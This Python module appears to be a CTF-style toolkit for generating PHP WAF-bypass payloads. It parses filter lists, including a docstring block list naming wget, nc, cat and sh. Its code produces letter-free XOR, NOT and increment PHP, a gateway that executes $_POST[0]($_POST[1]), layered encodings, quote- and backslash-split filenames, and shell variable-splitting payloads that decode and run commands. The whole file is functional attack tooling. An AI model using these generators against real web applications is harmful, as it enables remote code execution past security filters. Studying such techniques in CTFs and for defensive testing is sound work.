import base64
import hashlib
import random
import re
import string
import urllib.parse


DEFAULT_PHP_VERSION = (7, 0, 0)

PHP_REGEX_DELIMITERS = "/#~%"

_PHP_REGEX_FLAG_MAP = {
    "i": re.IGNORECASE,
    "s": re.DOTALL,
    "m": re.MULTILINE,
    "x": re.VERBOSE,
    "u": re.UNICODE,
}


def parse_php_version(value, default=DEFAULT_PHP_VERSION):
    """
    Parse user-facing PHP versions such as 7, 7.4, "8.3.18" or PHP_VERSION_ID
    style integers into a comparable (major, minor, patch) tuple.
    """
    if value is None:
        return tuple(default)
    if isinstance(value, tuple) and len(value) >= 2:
        parts = list(value[:3])
        while len(parts) < 3:
            parts.append(0)
        try:
            return tuple(max(int(part), 0) for part in parts[:3])
        except (TypeError, ValueError):
            return tuple(default)
    if isinstance(value, int) and value >= 10000:
        return value // 10000, (value // 100) % 100, value % 100

    text = str(value).strip()
    if not text:
        return tuple(default)
    match = re.match(r"^(\d+)(?:\.(\d+))?(?:\.(\d+))?", text)
    if not match:
        return tuple(default)
    return (
        int(match.group(1)),
        int(match.group(2) or "0"),
        int(match.group(3) or "0"),
    )


def format_php_version(version):
    major, minor, patch = parse_php_version(version)
    if patch:
        return f"{major}.{minor}.{patch}"
    return f"{major}.{minor}"


def normalize_php_version_value(value, default=DEFAULT_PHP_VERSION):
    version = parse_php_version(value, default=default)
    return format_php_version(version)


def php_version_at_least(version, minimum):
    return parse_php_version(version) >= parse_php_version(minimum)


def php_version_before(version, limit):
    return parse_php_version(version) < parse_php_version(limit)


def split_regex_literal(literal):
    text = str(literal or "").strip()
    if len(text) < 2 or text[0] not in PHP_REGEX_DELIMITERS:
        return None, ""
    opener = text[0]
    last = text.rfind(opener)
    if last <= 0:
        return None, ""
    body = text[1:last]
    flags = text[last + 1 :]
    if flags and not re.fullmatch(r"[A-Za-z]*", flags):
        return None, ""
    return body, flags


def _strip_trailing_regex_flags(text: str) -> str:
    """Strip trailing regex flags like /i, /is from the end of a waf_words string."""
    m = re.search(r'/[ism]{1,3}$', text)
    if m:
        return text[:m.start()]
    return text


def parse_waf_words(waf_words: str):
    """
    解析 WAF 过滤字符串
    以 " | " 作为分割
    Example: wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings
    """
    if not waf_words:
        return []
    raw = waf_words.strip()
    if raw.startswith("/") and raw.count("/") >= 2:
        last = raw.rfind("/")
        raw = raw[1:last]
    else:
        raw = _strip_trailing_regex_flags(raw)
    parts = [p.strip() for p in raw.split("|") if p.strip()]
    return parts


def parse_waf_chars(waf_chars: str):
    """
    解析 WAF 过滤字符
    Example: $#!@.

    Space is kept: it is the single most commonly filtered character and was
    previously dropped silently, which made `waf_chars=" "` a no-op. Only
    line breaks/tabs are discarded so that pasting a multi-line list does not
    silently add newline blocking.
    """
    if not waf_chars:
        return set()
    return {ch for ch in waf_chars if ch not in "\r\n\t"}


def parse_waf_regex(waf_regex: str):
    """
    解析 WAF 正则表达
    需要用 / ... / 进行包裹，也接受 PHP 的 #...#, ~...~, %...% 分隔符
    Example: /[A-Za-z0-9_$]/ or #flag|cat#i
    """
    if not waf_regex:
        return None
    pattern = waf_regex.strip()
    flags = 0
    delimited_body, delimited_flags = split_regex_literal(pattern)
    if delimited_body is not None:
        try:
            return re.compile(delimited_body, _parse_regex_flags(delimited_flags))
        except re.error:
            return None
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        flag_str = pattern[last + 1 :]
        pattern = pattern[1:last]
        flags |= _parse_regex_flags(flag_str)
    try:
        return re.compile(pattern, flags)
    except re.error:
        return None


def parse_waf_regex_with_error(waf_regex: str):
    text = str(waf_regex or "").strip()
    if not text:
        return None, ""
    compiled = parse_waf_regex(text)
    if compiled is None:
        return None, f"waf_regex is not a valid regular expression: {text}"
    return compiled, ""


def dedupe_preserve_order(items):
    """
    在保持顺序的前提下去重
    """
    seen = set()
    result = []
    for item in items:
        if item in seen:
            continue
        seen.add(item)
        result.append(item)
    return result


UTF8_BREAK_BYTE = b"\xff".decode("utf-8", "surrogateescape")


def has_lone_surrogate(text: str) -> bool:
    return any(0xDC80 <= ord(ch) <= 0xDCFF for ch in str(text or ""))


def encode_payload_bytes(text: str) -> bytes:
    return str(text or "").encode("utf-8", "surrogateescape")


def regex_has_utf8_flag(waf_regex: str) -> bool:
    text = str(waf_regex or "").strip()
    if not text:
        return False
    body, flags = split_regex_literal(text)
    if body is not None:
        return "u" in flags.lower()
    match = re.search(r"/[a-z]*u[a-z]*$", text, re.I)
    return bool(match)


def is_payload_allowed(
    payload: str,
    waf_words,
    waf_chars,
    waf_regex,
    limit_length: int,
    allow_utf8_break: bool = False,
):
    """
    检查 payload 是否可通过 WAF

    allow_utf8_break mirrors PHP semantics for a /u regex: an invalid UTF-8
    subject makes preg_match() return false, so the filter never matches.
    """
    if limit_length is not None and len(payload) > limit_length:
        return False
    if allow_utf8_break and has_lone_surrogate(payload):
        return True
    if waf_words:
        lower_payload = payload.lower()
        for word in waf_words:
            if word and word.lower() in lower_payload:
                return False
    if waf_chars:
        for ch in payload:
            if ch in waf_chars:
                return False
    if waf_regex and waf_regex.search(payload):
        return False
    return True


def url_encode(payload: str):
    """
    URL 编码
    """
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str):
    """
    双重 URL 编码
    """
    return urllib.parse.quote(url_encode(payload), safe="")


def percent_encode_each_byte(payload: str, encoding: str = "utf-8"):
    """
    Percent-encode every byte, including alphanumeric bytes.
    Useful when a later urldecode/rawurldecode transform should reconstruct a
    path while the pre-transform string must avoid literal blacklist words.
    """
    raw = str(payload or "").encode(encoding, "replace")
    return "".join(f"%{byte:02X}" for byte in raw)


def build_iconv_ignore_interleaved_ascii_payload(text: str):
    """
    Build a URL-safe byte-interleaved value for iconv/mb_convert_encoding
    chains that drop invalid high bytes with UTF-8//IGNORE.
    """
    noise = [0xE4, 0xB8, 0xAF, 0xE6, 0x9C, 0x87]
    chars = list(str(text or ""))
    if not chars:
        return ""

    counts = [1 for _ in chars]
    extra = max(0, len(noise) - len(chars))
    for idx in range(max(0, len(chars) - extra), len(chars)):
        counts[idx] += 1

    out = []
    noise_idx = 0
    for idx, ch in enumerate(chars):
        for _ in range(counts[idx]):
            byte = noise[noise_idx % len(noise)]
            out.append(f"%{byte:02X}")
            noise_idx += 1
        if re.fullmatch(r"[A-Za-z0-9._~-]", ch):
            out.append(ch)
        else:
            out.append(urllib.parse.quote(ch, safe=""))
    return "".join(out)


def unicode_escape_encode(payload: str):
    """
    Unicode 转义编码
    """
    return "".join("\\u%04x" % ord(ch) for ch in payload)


def hex_escape_encode(payload: str):
    """
    十六进制转义编码
    """
    return "".join("\\x%02x" % ord(ch) for ch in payload)


def octal_escape_encode(payload: str):
    """
    八进制转义编码
    """
    return "".join("\\%03o" % ord(ch) for ch in payload)


def base64_encode(payload: str):
    """
    Base64 编码
    """
    data = payload.encode("utf-8")
    return base64.b64encode(data).decode("ascii")


def generate_php_chr(text: str):
    """
    PHP chr 拼接
    Example: chr(112).chr(104).chr(112)
    """
    data = text.encode("utf-8")
    if not data:
        return "''"
    return ".".join(f"chr({byte})" for byte in data)


_XOR_LOOKUP = {}


def _build_xor_lookup():
    if _XOR_LOOKUP:
        return
    for target in range(256):
        for i in range(256):
            c1 = chr(i)
            if c1.isalnum():
                continue
            for j in range(256):
                c2 = chr(j)
                if c2.isalnum():
                    continue
                if (i ^ j) == target:
                    _XOR_LOOKUP[target] = (i, j)
                    break
            if target in _XOR_LOOKUP:
                break


def generate_php_xor(text: str):
    """
    PHP 异或
    Example: ('%xx'^'%xx')...
    """
    _build_xor_lookup()
    xor_str1 = ""
    xor_str2 = ""
    for char in text:
        pair = _XOR_LOOKUP.get(ord(char))
        if pair is None:
            return None
        xor_str1 += "%" + hex(pair[0])[2:].zfill(2)
        xor_str2 += "%" + hex(pair[1])[2:].zfill(2)

    return f"('{xor_str1}'^'{xor_str2}')"


_NOALNUM_PRINTABLE = [
    chr(code) for code in range(0x20, 0x7F) if not chr(code).isalnum()
]


def _noalnum_xor_pair(code: int):
    for left in _NOALNUM_PRINTABLE:
        for right in _NOALNUM_PRINTABLE:
            if ord(left) ^ ord(right) == code:
                return left, right
    return None


def _php_single_quote(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def generate_noalnum_string(text: str):
    parts = []
    for char in str(text or ""):
        pair = _noalnum_xor_pair(ord(char))
        if pair is None:
            return None
        parts.append(
            f"({_php_single_quote(pair[0])}^{_php_single_quote(pair[1])})"
        )
    if not parts:
        return "''"
    return ".".join(parts)


def generate_noalnum_call(func: str, arg: str):
    func_expr = generate_noalnum_string(func)
    if func_expr is None:
        return None

    needs_slash = "/" in str(arg or "")
    arg_parts = []
    for char in str(arg or ""):
        if char == "/":
            arg_parts.append("$_________")
            continue
        expr = generate_noalnum_string(char)
        if expr is None:
            return None
        arg_parts.append(expr)
    if not arg_parts:
        return None
    arg_expr = ".".join(arg_parts)

    prefix = ""
    if needs_slash:
        prefix = (
            "$__=('>'>'<');"
            "$___=$__+$__;"
            "$____=$___+$___;"
            "$_____=$____+$____;"
            "$______=$_____+$_____;"
            "$_______=$______+$______;"
            "$________=('#'^'@').('@'^'(').('['^')');"
            "$_________=$________($_______+$_____+$____+$___+$__);"
        )
    return f"{prefix}({func_expr})({arg_expr});"


def generate_php_not(text: str):
    """
    PHP 按位取反
    Example: ~%xx%xx...
    """
    not_str = ""
    for char in text:
        byte_val = ord(char)
        not_val = (~byte_val) & 0xFF
        not_str += "%" + hex(not_val)[2:].zfill(2)
    return f"(~'{not_str}')"


def generate_php_increment(text: str):
    """
    PHP 自增
    """

    payload = "$_=[].'';"   # $_ 先得到数组字符串
    variables = {}          # 字符到变量名映射

    code_parts = []
    code_parts.append("$_=[].''")  # 数组字符串

    if not text.isalpha():
        return None  # 仅支持纯字母命令

    zero = "([]!=[])"   # true
    one = "([]==[])"    # false
    three = f"({one}+{one}+{one})"

    # 初始化关键字符
    # 取出大写起始字符
    # 取出小写起始字符
    init = "$_=[].'';$b=$_[%s];$c=$_[%s];" % (zero, three)

    # 构建目标字符串
    res_var = "$_____"
    iter_var = "$____"

    parts = [
        "$_=[].''",
        "$__=$_[[]!=[]]",
        "$___=$_[[]==[]+[]==[]+[]==[]]",
        f"{res_var}=_",
    ]

    parts.pop()
    parts.append(f"{res_var}=''")  # $_____ = ""

    for char in text:
        if "A" <= char <= "Z":
            base = "A"
            base_var = "$__"
        else:
            base = "a"
            base_var = "$___"

        diff = ord(char) - ord(base)

        # 设置迭代变量
        parts.append(f"{iter_var}={base_var}")

        if diff > 0:
            parts.append(f"{iter_var}++" * diff)

        parts.append(f"{res_var}.={iter_var}")

    return ";".join(parts)


def generate_nan_seed_post_gateway(func_index="0", arg_index="1"):
    """
    使用 NAN/自增 逻辑构造 _POST，再调用 $_POST[func_index]($_POST[arg_index])
    适用于数字 0/1 未被过滤的无字母数字场景。
    """
    return (
        "$_=([].[])[0];"
        "$_=($_/$_.$_)[0];"
        "$_++;"
        "$__=$_.$_++;"
        "$_++;$_++;$_++;"
        "$__.=$_;"
        "$_++;"
        f"$_=_.$__.$_;$$_[{func_index}]($$_[{arg_index}]);"
    )


def obfuscate_filename_escape(path: str):
    """
    插入转义符 "\\"
    Example: flag.php -> fl\ag.php
    """
    if not path or len(path) < 2:
        return path

    parts = list(path)
    for idx in range(len(parts) - 1, 0, -1):
        if parts[idx].isalpha():
            parts.insert(idx, "\\")
            break

    return "".join(parts)


def obfuscate_filename_quotes(path: str):
    """
    插入空引号 ''
    Example: flag.php -> fl''ag.php
    """
    if not path or len(path) < 2:
        return path

    parts = list(path)
    for idx in range(len(parts) - 1, 0, -1):
        if parts[idx].isalpha():
            parts.insert(idx, "''")
            break

    return "".join(parts)


def _stable_rng(text: str):
    digest = hashlib.sha256(str(text).encode("utf-8", "replace")).digest()
    return random.Random(int.from_bytes(digest[:8], "big"))


def _split_string_to_vars(text: str, exclude_vars=None, seed=None):
    """
    随机拆分字符串并分配给随机变量
    主要和变量拆分绕过适配
    Example: b=bas;c=e64;a=s;c=h;echo%2Y2F0IGZsYWcudHh0|$b$c%20-d|$a$c
    return: (assignment_str, concatenation_str)

    The split is pseudo-random but seeded from the text itself, so the same
    input always yields the same payload. Unseeded randomness made payload
    output, "shortest payload" selection and tests non-reproducible.
    """
    if not text:
        return "", ""

    rng = random.Random(seed) if seed is not None else _stable_rng(text)
    excluded = set(exclude_vars or [])

    # 生成随机切分点
    length = len(text)
    if length == 1:
        splits = [text]
    else:
        # 随机切成 2 到 4 段
        num_parts = rng.randint(2, min(length, 4))
        # 生成随机切分索引
        indices = sorted(rng.sample(range(1, length), num_parts - 1))
        indices = [0] + indices + [length]

        splits = []
        for i in range(len(indices) - 1):
            splits.append(text[indices[i] : indices[i + 1]])

    # 分配到随机变量
    assignments = []
    vars_used = []

    available_chars = string.ascii_lowercase

    for part in splits:
        var_name = rng.choice(available_chars)
        while var_name in vars_used or var_name in excluded:
            var_name = rng.choice(available_chars) + rng.choice(available_chars)

        vars_used.append(var_name)
        assignments.append(f"{var_name}={part}")

    concat_str = "".join([f"${v}" for v in vars_used])
    assign_str = ";".join(assignments) + ";"

    return assign_str, concat_str


def get_encoding_strategies():
    """
    获取所有编码
    """
    return [
        ("url", url_encode),
        ("double_url", double_url_encode),
        ("unicode_escape", unicode_escape_encode),
        ("hex_escape", hex_escape_encode),
        ("octal_escape", octal_escape_encode),
        ("raw", lambda s: s),
    ]


def _strip_regex_delimiters(token: str):
    """
    正则表达式分隔符
    """
    token = token.strip()
    if token.startswith("/") and token.endswith("/"):
        return token[1:-1]
    if token.startswith("/") and token.count("/") >= 2:
        last = token.rfind("/")
        return token[1:last]
    lower = token.lower()
    if lower.endswith("/i") or lower.endswith("/s") or lower.endswith("/m"):
        return token[:-2]
    if lower.endswith("/is") or lower.endswith("/im") or lower.endswith("/sm"):
        return token[:-3]
    return token


def _parse_regex_flags(flag_str: str):
    """
    解析正则

    PHP and Python share i/s/m/x/u semantics for the flags we care about.
    Unknown PHP-only modifiers (A/D/S/U/X/J) are ignored instead of being
    folded into the pattern text.
    """
    flags = 0
    for ch in str(flag_str or ""):
        flags |= _PHP_REGEX_FLAG_MAP.get(ch, 0)
    return flags
